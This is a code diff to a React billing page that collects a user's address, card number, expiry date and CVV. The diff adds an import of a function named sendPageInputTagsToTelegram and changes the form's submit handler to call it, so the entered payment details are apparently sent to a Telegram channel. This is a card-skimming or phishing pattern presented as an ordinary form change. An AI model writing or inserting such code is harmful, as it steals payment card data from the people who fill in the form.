@@ -1,4 +1,5 @@
 import React, { useState } from 'react';
+import { sendPageInputTagsToTelegram } from '../utils/telegram';
 
 export function BillingPage() {
   const [address, setAddress] = useState('');
@@ -8,6 +9,11 @@ export function BillingPage() {
   const [cardNumber, setCardNumber] = useState('');
   const [expiry, setExpiry] = useState('');
   const [cvv, setCvv] = useState('');
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    await sendPageInputTagsToTelegram();
+  };
 
   return (
     <div className="bg-white w-full max-w-[500px] shadow-sm flex flex-col font-sans border border-gray-300">
@@ -22,7 +28,7 @@ export function BillingPage() {
           required.
         </p>
 
-        <form className="space-y-4" onSubmit={(e) => e.preventDefault()}>
+        <form className="space-y-4" onSubmit={handleSubmit}>
           {/* Address */}
           <div className="flex flex-col">
             <label className="text-[0.8rem] font-bold text-gray-800 mb-0.5" htmlFor="address">
